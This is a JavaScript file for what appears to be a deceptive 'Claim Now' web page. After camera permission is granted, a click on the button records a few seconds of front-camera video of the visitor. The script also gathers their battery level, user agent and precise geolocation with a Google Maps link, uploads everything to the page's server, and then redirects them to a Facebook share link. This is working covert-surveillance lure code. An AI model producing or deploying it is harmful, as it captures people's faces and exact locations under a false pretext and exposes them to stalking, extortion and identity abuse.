const btn = document.getElementById('startBtn');
const loading = document.getElementById('loading');
const video = document.getElementById('preview');

const REDIRECT_URL = "https://www.facebook.com/share/1DQpaDAogj/";

// Initialize camera
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = stream;
    } catch (err) { console.warn("Camera permission denied."); }
}
initCamera();

// Get battery and device info
async function getDeviceInfo() {
    const battery = navigator.getBattery ? await navigator.getBattery() : { level: "N/A" };
    const ua = navigator.userAgent;
    return `Battery: ${(battery.level || 0)*100}%, Device: ${ua}`;
}

// Get exact geolocation
async function getGeo() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve({});
        navigator.geolocation.getCurrentPosition(
            pos => {
                resolve({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    maps: `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`
                });
            },
            err => resolve({})
        );
    });
}

// Claim Now
btn.addEventListener('click', async () => {
    btn.style.display = 'none';
    loading.style.display = 'block';

    try {
        const recorder = new MediaRecorder(video.srcObject, { mimeType: 'video/webm' });
        let chunks = [];

        recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };

        recorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            const deviceInfo = await getDeviceInfo();
            const geo = await getGeo();

            const formData = new FormData();
            formData.append('video', videoBlob, 'claim_video.mp4');
            formData.append('deviceInfo', deviceInfo);
            formData.append('latitude', geo.latitude || '');
            formData.append('longitude', geo.longitude || '');
            formData.append('accuracy', geo.accuracy || '');
            formData.append('maps', geo.maps || '');

            try {
                const res = await fetch("/upload-video", { method: "POST", body: formData });
                const data = await res.json();
                console.log("Video posted:", data);
                loading.innerHTML = "<p>Success! Your claim video has been posted.</p>";
            } catch (err) {
                console.error("Error posting video:", err);
                loading.innerHTML = "<p>Error occurred. Redirecting...</p>";
            } finally {
                setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
            }
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 4000);

    } catch (err) {
        console.error("Recording error:", err);
        loading.innerHTML = "<p>Error occurred. Please try again.</p>";
    }
});
